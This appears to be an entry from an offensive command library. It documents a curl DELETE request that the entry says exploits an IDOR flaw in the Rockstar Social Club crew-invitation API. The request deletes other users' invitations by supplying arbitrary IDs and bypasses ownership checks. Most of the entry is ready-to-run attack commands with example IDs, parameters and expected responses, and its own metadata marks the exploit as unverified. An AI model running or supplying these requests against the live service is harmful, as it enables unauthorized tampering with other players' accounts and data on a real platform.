---
data: >-
  curl -X DELETE
  'https://socialclub.rockstargames.com/api/crews/invitations/ARBITRARY_INVITATION_ID/delete'
  -H 'Authorization: Bearer YOUR_JWT_TOKEN' -H 'Content-Type: application/json'
tags:
  - api
  - delete
  - web
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: e7c2e4d9-34f3-419b-902a-0387d118b602
created_at: '2025-12-14T17:25:34.533Z'
updated_at: '2025-12-14T17:25:34.533Z'
verified: false
validated: true
submitted: true
---
# curl-delete-crew-invitation

## Command

```bash
curl -X DELETE 'https://socialclub.rockstargames.com/api/crews/invitations/ARBITRARY_INVITATION_ID/delete' \
  -H 'Authorization: Bearer YOUR_JWT_TOKEN' \
  -H 'Content-Type: application/json'
```

## Description

This command uses curl to send a DELETE request to the Rockstar Social Club API endpoint for crew invitations, exploiting IDOR by specifying an arbitrary invitation ID. It requires a valid JWT token for authentication but bypasses ownership checks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X DELETE` | Specifies the HTTP DELETE method | Yes |
| URL path with `ARBITRARY_INVITATION_ID` | The endpoint URL including the manipulated invitation ID | Yes |
| `-H 'Authorization: Bearer YOUR_JWT_TOKEN'` | Authentication header with session JWT | Yes |
| `-H 'Content-Type: application/json'` | Sets the content type for the request | Yes |

## Examples

### Basic Usage

```bash
curl -X DELETE 'https://socialclub.rockstargames.com/api/crews/invitations/12345/delete' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...'
```

### Advanced Usage

Add `-v` for verbose output to debug responses:

```bash
curl -v -X DELETE 'https://socialclub.rockstargames.com/api/crews/invitations/12345/delete' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...' \
  -H 'Content-Type: application/json'
```

## Expected Output

On success: HTTP/1.1 200 OK with empty body or JSON success message like {"status":"deleted"}. On failure (if any check exists): 403 Forbidden or 404 Not Found.

## Related

- [[Related Procedure|procedures/Exploit-IDOR-to-Delete-Crew-Invitations]]
